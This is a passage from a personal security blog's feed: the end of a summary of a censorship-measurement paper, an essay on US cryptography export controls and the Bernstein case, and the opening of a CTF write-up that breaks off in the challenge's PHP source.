&lt;p&gt;The authors introduce &lt;em&gt;Disguiser&lt;/em&gt;, a system that uses a control server to be the target of all network requests from various vantage points to be the ground truth. These vantage points will be from RIPE Atlas, a common internet measurement platform, nodes the SOCKS proxy list, and some VPNs. The system removes any responses that are from caches, and achieves an incredibly high accuracy rate of 10^-6 false positive rates.&lt;/p&gt;

&lt;p&gt;The paper identifies 3 different censorship techniques, all living at the Application layer, a suite of protocols that deals with application to application communication over a network.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;DNS Blocking&lt;/em&gt;: Blocking DNS requests using RST/FIN injections to end connections.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;HTTP Blocking&lt;/em&gt;: Blocking HTTP requests using RST/FIN injections or dropping requests.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;HTTPS Blocking&lt;/em&gt;: Blocking HTTPS requests based off the domain name sent in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Client Hello&lt;/code&gt; portion of a TLS negotiation using RST/FIN injections, dropping packets, or injecting a forged certificate.&lt;/p&gt;

&lt;p&gt;Section three is a walkthrough of the more technical information of the &lt;em&gt;Disguiser&lt;/em&gt; system. It employs different methods for detecting DNS, HTTP, and HTTPS censorship, but each method boils down to knowing what a legitimate, uncensored result looks like, and comparing it to the actual result received experimentally. In order to minimize the impact of cached content in proxies at the boundary point of some networks, the vantage points effectively query a server that changes it’s content twice, and if the vantage point receives the same result, a proxy is shown to be present, and that data point is removed. The system also used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;traceroute&lt;/code&gt; to detect how many hops through a connection a censor is. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;traceroute&lt;/code&gt; increments up the Time to Live (TTL) field of an IP packet that contains censored information. Once the packet reaches a censor, the censorship is triggered.&lt;/p&gt;

&lt;p&gt;Section four dives into the data. There were two measurement periods, from April 2020 to May 2020 and June 2021 to August 2021, totaling about 58 million measurements within 177 countries. Of course Iran, China, the United Arab Emirates, and Saudi Arabia made the top four. France was shockingly in fifth. Upon closer inspection this was likely a local censorship implementation, as 4 out of the 159 vantage points within France were triggered. When looking at HTTP censorship, about 52% of censors used a block page, 38% reset the connection, and the remaining 10% let the connection time out. In HTTPS, 82% of censors tore down the connection, 16% timed out, and only 2% injected malicious certificates.&lt;/p&gt;

&lt;p&gt;This one has really sick graphics, absolutely give it a look.&lt;/p&gt;

&lt;h3 id=&quot;thoughts-4&quot;&gt;Thoughts&lt;/h3&gt;

&lt;p&gt;This paper shows that China’s censorship system is not the MOST draconian in the world, however I would be incredibly surprised if someone was able to beat Iran in anything with the word “draconian” in it. I did appreciate the enumeration of the different censorship methods by protocol, though I wonder if that list is exhaustive.&lt;/p&gt;

&lt;h1 id=&quot;music-from-this-week&quot;&gt;Music from this week&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/7oRhPLG0SE4hawbLwVmnZS?go=1&amp;amp;sp_cid=0ac96f7482ca38554f220c9b07346566&amp;amp;utm_source=embed_player_p&amp;amp;utm_medium=desktop&amp;amp;nd=1&amp;amp;dlsi=75fce6c0d4584d32&quot;&gt;Sixteen Tons&lt;/a&gt; - Johnny Cash&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/53IRnAWx13PYmoVYtemUBS?go=1&amp;amp;sp_cid=0ac96f7482ca38554f220c9b07346566&amp;amp;utm_source=embed_player_p&amp;amp;utm_medium=desktop&amp;amp;nd=1&amp;amp;dlsi=219e28f27faf497a&quot;&gt;Femininomenon&lt;/a&gt; - Chappell Roan&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/3BQmmSfxwwGH8VCvja9uWV?go=1&amp;amp;sp_cid=0ac96f7482ca38554f220c9b07346566&amp;amp;utm_source=embed_player_p&amp;amp;utm_medium=desktop&amp;amp;nd=1&amp;amp;dlsi=59f0fa86b51f4264&quot;&gt;Stuff is Messed Up&lt;/a&gt; - The Offspring&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/7Et3UkjbCjRhRaACPBXRQg?go=1&amp;amp;sp_cid=0ac96f7482ca38554f220c9b07346566&amp;amp;utm_source=embed_player_p&amp;amp;utm_medium=desktop&amp;amp;nd=1&amp;amp;dlsi=841a3c7756404854&quot;&gt;Te Han Prometido&lt;/a&gt; - Leo Dan&lt;/p&gt;</content><author><name>Jake Mullins</name></author><category term="year-of-hacking" /><category term="china" /><category term="censorship" /><summary type="html">I had a bit of free time on my hands last summer, so I occupied myself by going through and learning absolutely everything I could about the Great Firewall of China. This ended up being one of the three countries I hastily presented on at the BYU Cybersecurity Symposium in February, the other two being Egypt and Russia. I have since forgotten all of the information, mostly because I wasn’t nearly as good at digesting papers and information as I am now. In an effort to rectify that, I’m codifying my notes instead of using handwritten versions in various OneNotes scattered in my cloud storage.</summary></entry><entry><title type="html">Week 14 - Dual Use Technologies - Cryptography</title><link href="http://localhost:4000/year-of-hacking-0xe" rel="alternate" type="text/html" title="Week 14 - Dual Use Technologies - Cryptography" /><published>2024-07-13T00:00:00-06:00</published><updated>2024-07-13T00:00:00-06:00</updated><id>http://localhost:4000/Year-of-Hacking-0xe</id><content type="html" xml:base="http://localhost:4000/year-of-hacking-0xe">&lt;p&gt;I’ve planned a three-part series on how American industrial policy has affected technology development by highlighting the history of a few dual-use technologies. Today, we’ll look at past attempts by the American Government to govern the flow of cryptography research. In the next installment, I’ll look at the government’s involvement in AI Research and chip fabrication.&lt;/p&gt;

&lt;h1 id=&quot;cryptography&quot;&gt;Cryptography&lt;/h1&gt;
&lt;p&gt;For younger hackers, it’s surprising to learn that cryptography was once a heavily regulated field. We’re used to running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pip install pycryptodome&lt;/code&gt; and having free reign of state-of-the-art open-source cryptography tools. The open-source nature of this software provides a net benefit from the security that encryption provides to our increasingly networked world.&lt;/p&gt;

&lt;p&gt;However, portions of the US Government have held differing viewpoints over the years. Cryptography was once solely the responsibility of military signals intelligence personnel until about the middle of the Cold War. Think &lt;a href=&quot;https://en.wikipedia.org/wiki/Alastair_Denniston&quot;&gt;Commander Deniston&lt;/a&gt; (Charles Dance’s character) in The Imitation Game. As such, cryptography was defined as a military asset by the Department of State’s International Traffic in Arms Regulation (ITAR). This is the same regulation set that governs the export of military assets like ammunition, firearms, spacecraft, and nuclear weapons research. The fear of the era was that sharing cryptographic techniques would jeopardize national security by exposing Signals Intelligence (SIGINT) sources to adversaries.&lt;/p&gt;

&lt;p&gt;SIGINT is one of the five main intelligence sources and deals with electronic communications. Intercepting these signals and turning them into actionable intelligence has been the National Security Agency’s primary responsibility since its foundation in 1951. In those days, the NSA busied themselves with intercepting analog phone calls and radio communications. As analog gave way to digital, the NSA has worked hard to keep ahead of the curve. In the modern era, they conduct honest-to-god cyberwarfare, with the most famous publicly known operation being &lt;a href=&quot;https://en.wikipedia.org/wiki/Stuxnet&quot;&gt;Stuxnet&lt;/a&gt;, a malware operation discovered in 2010 that crippled Iranian Uranium enrichment efforts for at least half a decade. For the unquestioningly loyal the NSA represents American-bred high technology forwarding democracy abroad and &lt;a href=&quot;https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/3136987/how-nsa-us-cyber-command-are-defending-midterm-elections-one-team-one-fight/&quot;&gt;protecting&lt;/a&gt; &lt;a href=&quot;https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/3608324/us-and-international-partners-issue-recommendations-to-secure-software-products/&quot;&gt;our&lt;/a&gt; &lt;a href=&quot;https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/3849499/nsa-joins-fbi-and-others-to-warn-of-north-korea-cyber-espionage-campaign/&quot;&gt;digital&lt;/a&gt; &lt;a href=&quot;https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/3833594/nsas-final-zero-trust-pillar-report-outlines-how-to-achieve-faster-threat-respo/&quot;&gt;assets&lt;/a&gt; at &lt;a href=&quot;https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/3735130/nsa-issues-guidance-for-maturing-data-security/&quot;&gt;home&lt;/a&gt;. For the private, disillusioned, paranoid, or outspoken, the NSA is the most &lt;a href=&quot;https://www.eff.org/nsa-spying&quot;&gt;advanced&lt;/a&gt; &lt;a href=&quot;https://www.eff.org/press/releases/diverse-groups-fly-airship-over-nsas-utah-data-center-protest-illegal-internet-spying&quot;&gt;surveillance&lt;/a&gt; &lt;a href=&quot;https://www.aclu.org/news/national-security/nsa-continues-violate-americans-internet-privacy&quot;&gt;network&lt;/a&gt; in the world that has easily &lt;a href=&quot;https://en.wikipedia.org/wiki/Edward_Snowden&quot;&gt;turned on Americans&lt;/a&gt; labelled &lt;a href=&quot;https://commons.lib.jmu.edu/cgi/viewcontent.cgi?article=1280&amp;amp;context=mhr&quot;&gt;troublemakers&lt;/a&gt; by the Government.&lt;/p&gt;

&lt;h3 id=&quot;but-what-is-cryptography&quot;&gt;But what is cryptography?&lt;/h3&gt;
&lt;p&gt;Cryptography is the mathematical science of transmitting data between two trusted points over an untrusted medium in a way that the data cannot be deciphered if intercepted. You may remember the push to visit websites that only start with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://&lt;/code&gt; and steer clear from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://&lt;/code&gt; sites that began in the early 2000s. This is because the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://&lt;/code&gt; means the connection is encrypted, preventing a “man-in-the-middle” attack from altering or intercepting sensitive data.&lt;/p&gt;

&lt;p&gt;In a typical symmetric cryptosystem, you have five pieces of information you care about:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;em&gt;Plaintext&lt;/em&gt;: The information you want to hide.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;Key&lt;/em&gt;: The piece of information used to both encrypt and decrypt the plaintext.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;Ciphertext&lt;/em&gt;: Encrypted information that should be unintelligible to an outside observer.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;Encryption function&lt;/em&gt;: Mathematical process that takes the &lt;em&gt;plaintext&lt;/em&gt; and the &lt;em&gt;key&lt;/em&gt; to produce the &lt;em&gt;ciphertext&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;Decryption function&lt;/em&gt;: Mathematical process that takes the &lt;em&gt;ciphertext&lt;/em&gt; and the &lt;em&gt;key&lt;/em&gt; to produce the &lt;em&gt;plaintext&lt;/em&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Notice that you use the same key to both encrypt and decrypt the data, hence the adjective “symmetric” in symmetric cryptography. The key is shared over a secure channel between the two hosts. This ensures the confidentiality of the encrypted data. Some of the modern algorithms in this group are AES, DES, and Blowfish. This scheme commonly used when you want to encrypt data while it remains in a file or a database when it’s not being actively used.
![[Pasted image 20240808000959.png]]&lt;/p&gt;

&lt;p&gt;A different paradigm exists called asymmetric cryptography, which uses a combination of public and private keys to both ensure confidentiality and non-repudiation, a fancy word for provable authorship of data. This is useful when validating the source of data or software. If a piece of data can be decrypted with a public key, then we know that it was encrypted with the private key.
![[Pasted image 20240808001343.png]]&lt;/p&gt;

&lt;p&gt;This architecture is more complicated to set up, but the benefits of non-repudiation often outweigh the upfront costs. This include the EC25519 and RSA algorithms.&lt;/p&gt;

&lt;h3 id=&quot;cryptography-and-the-us-governments-failings&quot;&gt;Cryptography and the US Government’s Failings&lt;/h3&gt;
&lt;p&gt;The national security implications of implementing cryptography become apparent if the medium that the data is being transmitted over, be it a fiber-optic hard line, DSL link, or electromagnetic waves through the open air, is compromised or intercepted. In the days of ARPANET, when four universities exchanged research data over phone lines, the stakes of the data being intercepted and tampered with were low. In the seventies, however, digital networked systems increased in complexity and capability and became a cornerstone in the banking and defense sectors of the American economy. These two sectors require security as a cornerstone of their operations. In the modern landscape, those two sectors are the biggest employers of top-notch cybersecurity talent. This required the introduction of encryption into civilian digital infrastructure to protect financial assets and classified information. In 1977, NIST ratified the Data Encryption Standard (DES) algorithm developed by IBM as a requirement of the Federal Information Processing Standards (FIPS). This required any contractors handling sensitive government data must encrypt it using the DES algorithm. DES is a symmetric encryption method that can take 64-bit message blocks and encrypt them with a 56-bit key. In 1976, before the ratification, Researcher Paul Baran theorized that DES would take about &lt;a href=&quot;http://www.toad.com/des-stanford-meeting.html&quot;&gt;20 million dollars&lt;/a&gt; to break with the hardware of the time. There are only $2^{56}$ or 72 quadrillion possible keys due to the key length being 56 bits. That sounds like a lot unless you work in tech, then you can likely intuit that this is a painfully small amount of possible keys to decrypt data that could have serious national security implications. In 1998, the Electronic Frontier Foundation would demonstrate that it was &lt;a href=&quot;https://w2.eff.org/Privacy/Crypto/Crypto_misc/DESCracker/&quot;&gt;possible&lt;/a&gt; to break the encryption for about 250,000 dollars with mostly off-the-shelf parts in about 3 days. Projecting that rate of improvement to today, it would now take something like a grand of hardware to execute the same attack. Well within the cost of a mid-range laptop.
&lt;img src=&quot;https://w2.eff.org/Privacy/Crypto/Crypto_misc/DESCracker/imgz/board300.jpg&quot; alt=&quot;Deep Crack&quot; /&gt;
&lt;em&gt;Deep Crack, the custom-built machine to crack DES by the EFF in 1998&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Before cryptography had fully embedded itself into the public sector, the Department of Defense had to sign off on any export of cryptography. This means that any research papers, source code, and compiled code would require approval by the Department of Defense before publication. The American Government legally censored cryptographic research, stifling the development of secure methods of communication for Americans and the rest of the world. That previous sentence likely made you question the competence of the American policymaker. You may feel this way because you understand Kerckhoff’s principle, even if you’re not a trained cryptographer.&lt;/p&gt;

&lt;p&gt;Kerckhoff’s principle is a core design philosophy of modern cryptographic systems. The principle states that a cryptosystem should be perfectly secure even if everything except the secret key is known to an attacker. This means that an attacker cannot decrypt a message even if they know the version of the specific cryptographic implementation, destination, source, message length, or any other characteristic of the message. In the modern internet environment, including the connection you are reading this article on, sometimes more than a dozen separate legitimate organizations intercept the data that makes up this website. No one, not even an attacker with full access to one of the routers handling this connection, will be able to read the plaintext contents of the encrypted data without possessing the secret if an encryption scheme was implemented correctly.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;There are some &lt;a href=&quot;https://crypto.stanford.edu/~dabo/cryptobook/BonehShoup_0_6.pdf#page=28&quot;&gt;caveats&lt;/a&gt; with the phrase “perfectly secure” that will make mathematicians who attended week 2 of a graduate-level cryptography class bristle at my cavalier usage of it. To a layman, however, the point gets across.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Kerckhoff’s principle is a vocab word that every Mathematics, Information Technology, and Cybersecurity student has had to memorize for a multiple-choice question on a midterm (or in my case, a crossword answer). The principle is intuitive. In a scenario where you are transmitting sensitive information over a medium that can be intercepted, it is only a matter of time before an attacker reverse-engineers the encryption scheme. A cryptosystem that is designed to be secure by having many complicated steps in the encryption and decryption processes that are unknown to an attacker is objectively worse than a cryptosystem that relies on public and peer-reviewed algorithms and implementations. This makes sense for the same reason that open source is so powerful. Anyone with the proper training can discover vulnerabilities and make them public. Good-faith researchers can point out flaws in an implementation, preventing them from being used by cybercriminals and nation-states alike. Improving the security of an algorithm and thus the entire internet ecosystem.&lt;/p&gt;

&lt;p&gt;With this understanding, it is no surprise that the Government has not sought to restrict the export of cryptography to the international community in nearly three decades. If the Government could only utilize research from American cryptographers who can obtain clearance, want to live in Washington DC, and are willing to be underpaid for their skills instead of raking it in as a high-frequency trader on Wall Street, the American Military would fall behind the rest of the world, a state of affairs that is entirely anathema to what it means to be an American. The last time the US Government tried to exercise these export controls on academic cryptography research resulted in Bernstein v. Department of Justice, 1998. This landmark case set the precedent that source code is protected as freedom of speech under the First Amendment.&lt;/p&gt;

&lt;h3 id=&quot;bernstein-v-united-states-and-code-as-speech&quot;&gt;Bernstein v. United States and Code as Speech&lt;/h3&gt;
&lt;p&gt;In 1990, Daniel J. Bernstein, an American Berkeley student, developed an experimental algorithm called Snuffle. He attempted to comply with export controls to distribute his work to Sci.crypt, a cryptography-centric forum. He was denied an export license despite his insistence that there was no military utility to the work. Bernstein appealed his initial request but was &lt;a href=&quot;https://groups.csail.mit.edu/mac/classes/6.805/student-papers/fall95-papers/kokoski-crypto.html&quot;&gt;ignored for fifteen months&lt;/a&gt; despite regulations requiring a government response to such requests within thirty days. In 1995, Bernstein and the Electronic Frontier Foundation filed a lawsuit in the North District of California against the US Government, alleging export controls on source code and research were unconstitutional.&lt;/p&gt;

&lt;p&gt;Source code can be viewed as a different from of a plain English representation of an algorithm. Using a program called a compiler to turn source code into executable code, source code can be subjected to the same academic rigor that a typical mathematical proof is through automated testing. An excerpt from the &lt;a href=&quot;https://archive.epic.org/crypto/export_controls/bernstein_decision_9_cir.html&quot;&gt;argument presented by Bernstein’s lawyers&lt;/a&gt; highlights how keeping in line with the First Amendment requires treating source code with the same freedom of speech protections as a plain-English algorithm:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;As noted earlier, the chief task for cryptographers is the development of secure methods of encryption. While the articulation of such a system in layman’s English or in general mathematical terms may be useful, the devil is, at least for cryptographers, often in the algorithmic details. By utilizing source code, a cryptographer can express algorithmic ideas with precision and methodological rigor that is otherwise difficult to achieve. This has the added benefit of facilitating peer review – by compiling the source code, a cryptographer can create a working model subject to rigorous security tests. The need for precisely articulated hypotheses and formal empirical testing, of course, is not unique to the science of cryptography; it appears, however, that in this field, source code is the preferred means to these ends.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Footnote 14 of that document points out that the subject of this article, Bernstein’s Snuffle algorithm, isn’t even a complete cryptographic product. It’s just an educational proof of concept. The plaintiffs argue that the Government mistakenly separates source code as unable to constitute a meaningful expression, as opposed to something like a blueprint or a manual, because of the presence of “direct functionality.” They argue that if Adam Smith wrote the Wealth of Nations with equations or graphs, it would potentially be subject to prepublication review to show the absurdity of regulating academic discourse based on the possibility for the findings to be applicable in the real world. The National Security Agency has shown a disregard for considering cryptographic source code as expression, stripping it of First Amendment protections. The article cites a statement made by the NSA:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Whatever ideas may be reflected in the software, or the intent of the exporter to convey ideas, the NSA recommends that encryption software be controlled for export solely on the basis of what it does.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;There have been instances where First-Amendment protections can be legally trampled in the face of a plausible and immediate national security threat. The argument cites the famous United States v. Progressive Inc. where the Department of Energy sought an injunction against &lt;em&gt;The Progressive&lt;/em&gt;, an American magazine, for attempting to publish an article on the technical details of the then-classified Hydrogen Bomb. According to the &lt;a href=&quot;https://firstamendment.mtsu.edu/article/united-states-v-progressive-inc-w-d-wis/&quot;&gt;Free Speech Center&lt;/a&gt;, the injunction was ultimately unsuccessful in its goal as at least seven publications released similar articles. Skimming through the article today, it’s interesting how the information that drew the American Government’s ire 50 years ago is now common knowledge for anyone with a cursory interest in nuclear energy, or enjoy videos on &lt;a href=&quot;https://www.youtube.com/watch?v=v9srYCefm18&quot;&gt;Kerbal Space Program&lt;/a&gt;. Despite this failure to contain delicate information, the case is cited today when the American Government seeks to preserve national security at the expense of free journalism. If Bernstein was a cleared ex-NSA cryptographer known to be sympathetic to the Soviet Union publishing classified algorithms to a European journal, a credible national security threat is present, and an export license could easily be denied to prevent the dissemination of state secrets. However, Bernstein was a researcher at a top-of-the-line public research university developing his own encryption algorithm. His work presented no credible and immediate national security threat, and thus restriction of his work under ITAR was deemed unconstitutional by Judge Patel.&lt;/p&gt;

&lt;h3 id=&quot;cryptography-and-the-us-governments-successes&quot;&gt;Cryptography and the US Government’s Successes&lt;/h3&gt;
&lt;p&gt;Bernstein v. United States was decided in 1996 with attempts made to reverse the decision going all the way to 2003. In the intervening 28 years, there have been no public attempts by the US government to regulate academic research into cryptography and the development of new algorithms and attacks. In fact, the CHIPS and Science act provides funding for public research into future-proofing our communications systems with quantum cryptography. This shift has shown that the American policymaker is actually capable of making a forward-thinking decision, much to many Americans’ surprise. When/if/when we can get quantum computers working, these expensive gizmos have the capability of revolutionizing the world of cryptography, making computationally impossible attacks with classical computers not only feasible, but trivial. If you’re a remarkably short-sighted national security professional, this investment into public research into quantum cryptography could strip the ability of the American intelligence community to create actionable intelligence in the future. However, any intelligence analyst will tell you that our adversaries are capable of developing quantum hardware and are not likely to share the advancements with the rest of the world. The difference between the United States and our four major adversaries in China, Russia, Iran, and North Korea is that we choose to govern as a liberal democracy. Our policymakers are incentivized to recognize when the short-term gains of increased visibility into the world’s communications at the expense of long-term security for both our people and our nation is a tradeoff that should not be made. It seems we have exported this habit to other nations. Today, the cryptography community is full of hackers, academics, government researchers, and hobbyists from every corner of the globe, with American universities training the top minds in the field.&lt;/p&gt;

&lt;h3 id=&quot;resources&quot;&gt;Resources&lt;/h3&gt;
&lt;p&gt;Here’s a list of my favorite resources that provide a good introduction to Cryptography without a formal mathematics background.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;cryptohack.com&quot;&gt;Cryptohack&lt;/a&gt;: A website that teaches advanced cryptography from first principles. Go from XORing messages to implementing elliptical curve cryptography and beyond by hand.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;&quot;&gt;Cryptohack Discord&lt;/a&gt;: The discord community for the Cryptohack website. Join hobbyists, hackers, and researchers alike unified in their love for breaking into things.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;&quot;&gt;cryptopals&lt;/a&gt;: Another website providing CTF-like challenges for cryptography.&lt;/li&gt;
  &lt;li&gt;Math 290 textbook: Helps with writing proofs&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://crypto.stanford.edu/~dabo/cryptobook/BonehShoup_0_6.pdf&quot;&gt;A Graduate Course in Applied Cryptography&lt;/a&gt;: Free textbook from Stanford&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://nessie.ilab.sztaki.hu/~kornai/2021/MatematikaAlapjai/ChartrandPolimeniZhang.pdf&quot;&gt;Mathematical Proofs: A Transition to Advanced Mathematics&lt;/a&gt;: Introduction to thinking and writing proofs.
If you are already have a formal mathematical background, I asked my friend &lt;a href=&quot;https://www.linkedin.com/in/macen-bird/&quot;&gt;Macen Bird&lt;/a&gt; to collate some of advanced resources in the space:&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.jmilne.org/math/CourseNotes/FT.pdf&quot;&gt;Fields and Galois Theory&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.jmilne.org/math/CourseNotes/ANT.pdf&quot;&gt;Algebraic Number Theory&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://ur4ndom.dev/posts/2024-02-26-lattice-training/&quot;&gt;Practical lattice reductions for CTF challenges&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.davidwong.fr/blockbreakers/aes.html&quot;&gt;AES Cryptanalysis for beginners&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://hal.science/hal-03045663/document&quot;&gt;Cryptographic key recovery paper&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rareskills.io/post/elliptic-curves-finite-fields&quot;&gt;Elliptic Curves over Finite Field - Used in any elliptic curve algorithm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/josephsurin/lattice-based-cryptanalysis/blob/main/tutorial.pdf&quot;&gt;A Gentle Tutorial for Lattice-Based Cryptanalysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/isislovecruft/library--/blob/master/cryptography%20%26%20mathematics/An%20Introduction%20to%20Mathematical%20Cryptography%20(2014)%20-%20Hoffstein%2C%20Pipher%2C%20Silverman.pdf&quot;&gt;An Introduction to Mathematical Cryptography&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://web.archive.org/web/20220508113525/https://www.cryptool.org/download/ctb/CTB-Chapter_Lattice-Introduction_en.pdf&quot;&gt;Lightweight Introduction to Lattices&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;music-from-this-week&quot;&gt;Music from this week&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/2Dl6xEOmTWxi633TuZITw5?si=bb8e9dbbaf6048da&quot;&gt;Akhasmak Ah&lt;/a&gt; - Nancy Ajram&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/3qQbCzHBycnDpGskqOWY0E?si=5e81043b38114719&quot;&gt;Ella Baila Sola&lt;/a&gt; - Estaban Armado&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/3YyTyWfSwAhesGCKpnuRKl?si=1dd569003a664c1e&quot;&gt;LA PEOPLE II&lt;/a&gt; - Peso Pluma, Tito Double P, Joel De La P&lt;/p&gt;</content><author><name>Jake Mullins</name></author><category term="year-of-hacking" /><category term="cryptography" /><category term="censorship" /><category term="america" /><category term="usa" /><category term="government" /><category term="nsa" /><summary type="html">I’ve planned a three-part series on how American industrial policy has affected technology development by highlighting the history of a few dual-use technologies. Today, we’ll look at past attempts by the American Government to govern the flow of cryptography research. In the next installment, I’ll look at the government’s involvement in AI Research and chip fabrication.</summary></entry><entry><title type="html">Week 11 - DUCTF - Sniffy</title><link href="http://localhost:4000/year-of-hacking-0xb" rel="alternate" type="text/html" title="Week 11 - DUCTF - Sniffy" /><published>2024-07-09T00:00:00-06:00</published><updated>2024-07-09T00:00:00-06:00</updated><id>http://localhost:4000/Year-of-Hacking-0xb</id><content type="html" xml:base="http://localhost:4000/year-of-hacking-0xb">&lt;p&gt;For the &lt;del&gt;3&lt;/del&gt; 4 people that read this and have been waiting for me next post with bated breath, I started last month as a Security Engineer Intern at Affirm, so I moved out to beautiful (and busy) San Francisco on about 2 weeks notice for the summer. Things are a little crazy, to say the least. Now that life has chilled out a bit, I should be able to get back into my routine of publishing these posts. However, life will not return any sense of normalcy until I find a cheap Mexican spot that’s open 24/7 within half a mile of my coffin apartment in SOMA neighborhood. For now, I am relying on the endurance I acquired during the great &lt;a href=&quot;https://www.instagram.com/provorancheritos/p/CjRGJPKOtNI/?locale=de-DE&amp;amp;img_index=1&quot;&gt;Provo Rancheritos Remodeling Riots of 2022&lt;/a&gt;. Musing about my lack of good nutrition aside, I am thoroughly thankful for the opportunity to be working and living here.&lt;/p&gt;

&lt;p&gt;This weekend, I participated in the very good Down Under CTF under BYU Cyberia. After this CTF, even though we finished in 95th, we are now 16th in the country! We’ve been working hard, and I’m very happy to see our efforts be rewarded. I didn’t solve any challenges, but in my attempts, I did learn a lot. Here’s my post-CTF writeup of &lt;em&gt;Sniffy&lt;/em&gt;. I was actually on the correct track, but I missed a few key details.&lt;/p&gt;

&lt;h2 id=&quot;sniffy&quot;&gt;Sniffy&lt;/h2&gt;
&lt;p&gt;We get a nice little website of kookaburra sounds, where we can switch themes on the top right:
&lt;img src=&quot;assets/images/blog/week11/sniffy-main-page.png&quot; alt=&quot;assets/images/blog/week11/sniffy-main-page.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We also get a file download for the website with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dockerfile&lt;/code&gt;. It looks like this is a php application running from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php:8.3-apache&lt;/code&gt; base image. We also get some php logic in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;  
  
&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;flag.php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
  
&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;theme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;theme&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dark&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dark&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;light&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
  
&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;other_theme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
